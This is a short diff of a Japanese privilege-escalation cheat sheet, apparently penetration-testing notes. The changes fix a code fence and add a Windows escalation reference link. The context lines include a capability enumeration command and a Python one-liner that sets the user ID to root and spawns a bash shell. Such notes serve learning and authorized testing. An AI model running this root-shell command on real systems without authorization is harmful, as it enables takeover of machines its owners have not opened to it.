@@ -394,7 +394,7 @@ getcap -r / 2>/dev/null
 
 python -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
-``
+```
 
 上記でpython 以外が出てきたら、[gtfobins](https://gtfobins.github.io/) から、該当のコマンドを探す。
 
@@ -405,6 +405,8 @@ python -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
 
 # 特権エスカレーション基本戦略 (Windows)
+
+[毎回必ず見る資料](https://xorond.com/posts/2021/04/windows-local-privilege-escalation/)
 
 https://github.com/AonCyberLabs/Windows-Exploit-Suggester
 
